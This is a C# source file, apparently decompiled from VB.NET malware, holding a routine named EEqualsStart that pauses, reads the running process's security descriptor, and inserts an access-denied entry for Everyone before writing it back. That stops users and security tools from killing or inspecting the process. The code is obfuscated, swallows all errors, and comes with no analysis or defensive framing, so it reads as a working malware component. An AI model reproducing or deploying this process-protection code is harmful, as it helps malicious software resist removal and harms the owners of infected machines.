using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class EEqualsElevate
{
	public class EEqualsElevation
	{
		[Flags]
		public enum objEnum
		{
			objXPaa = 0xF0FFF
		}

		[DllImport("advapi32.dll", SetLastError = true)]
		private static extern bool GetKernelObjectSecurity(IntPtr Handle, int securityInformation, [Out] byte[] pSecurityDescriptor, uint nLength, ref uint lpnLengthNeeded);

		public static void EEqualsStart()
		{
			Thread.Sleep(4100);
			try
			{
				IntPtr currentProcess = GetCurrentProcess();
				RawSecurityDescriptor rawSecurityDescriptor = objSecurity2(currentProcess);
				rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 987135, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
				objSecurity(currentProcess, rawSecurityDescriptor);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		[DllImport("kernel32.dll")]
		public static extern IntPtr GetCurrentProcess();

		[DllImport("advapi32.dll", SetLastError = true)]
		private static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, [In] byte[] pSecurityDescriptor);

		private static T objList<T>(ref T L, T M)
		{
			try
			{
				L = M;
				return M;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				T result = default(T);
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static void objSecurity(IntPtr objXPh, RawSecurityDescriptor objXD)
		{
			try
			{
				byte[] array = new byte[checked(objXD.BinaryLength - 1 + 1)];
				objXD.GetBinaryForm(array, 0);
				if (!SetKernelObjectSecurity(objXPh, 4, array))
				{
					throw new Win32Exception();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public static RawSecurityDescriptor objSecurity2(IntPtr XPh)
		{
			try
			{
				byte[] L = new byte[0];
				uint lpnLengthNeeded = default(uint);
				GetKernelObjectSecurity(XPh, 4, L, 0u, ref lpnLengthNeeded);
				if ((long)lpnLengthNeeded >= 0L && (long)lpnLengthNeeded <= 32767L)
				{
					checked
					{
						if (!GetKernelObjectSecurity(XPh, 4, objList(ref L, new byte[(int)(unchecked((long)lpnLengthNeeded) - 1L) + 1]), lpnLengthNeeded, ref lpnLengthNeeded))
						{
							throw new Win32Exception();
						}
						return new RawSecurityDescriptor(L, 0);
					}
				}
				throw new Win32Exception();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				RawSecurityDescriptor result = null;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}
}
